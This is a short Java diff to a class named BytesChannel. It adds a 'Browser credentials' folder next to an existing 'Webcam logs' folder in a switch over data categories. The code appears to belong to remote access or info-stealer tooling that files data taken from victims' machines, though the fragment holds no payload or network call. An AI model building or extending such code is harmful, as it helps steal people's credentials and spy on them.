@@ -37,6 +37,9 @@ public class BytesChannel {
             case WEBCAM_LOGS -> {
                 categoryOutputFolder = "Webcam logs";
             }
+            case BROWSER_CREDENTIALS -> {
+                categoryOutputFolder = "Browser credentials";
+            }
         }
     }
 
